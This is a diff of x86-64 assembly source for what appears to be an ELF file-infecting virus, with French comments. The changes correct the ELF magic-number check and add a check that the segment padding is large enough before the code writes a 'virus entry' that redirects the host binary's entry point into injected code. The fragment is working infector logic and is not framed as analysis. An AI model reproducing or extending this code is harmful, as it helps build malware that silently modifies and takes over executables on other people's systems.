@@ -56,7 +56,7 @@ check_signature:
     
 check_file_integrity:
     mov rdi, [r12 + fileData]
-    cmp dword [rdi], 1179403647 ; magic number 0x7f454c46 464c457f
+    cmp dword [rdi], 0x464c457f ; magic number 0x7f454c46 464c457f
 	jnz simple
 	mov sil, [rdi + s_support]
 	cmp sil, 1			; cmp 32 bit
@@ -88,8 +88,6 @@ simple:
     lea rdi, [r12 + fileName]
     call append_signature
     jmp close_mmap
-
-
 
 
 get_file_entry:
@@ -125,8 +123,14 @@ check_pload_size:
     mov rdi, [r13 + p_align]
     div rdi
     sub rdi, rdx
-    cmp rdi, PROG_SIZE
+    cmp rdi, PROG_SIZE                      ; regarde si on a assez de place dans le bourrage et fait un simple append de la signature si on a pas assez
     jl simple
+    mov rax, [r13 + p_filesz]
+    add rax, PROG_SIZE
+    mov rdi, [r12 + fileSize]
+    cmp rdi, rax
+    jl simple                               ; si le pload + le programe est plus grand que le fichier
+
 
 write_virus_entry:
     mov rdi, [r13 + p_vaddr]             ; met l'entry a la fin du premier pload = p_vaddr + p_memsz
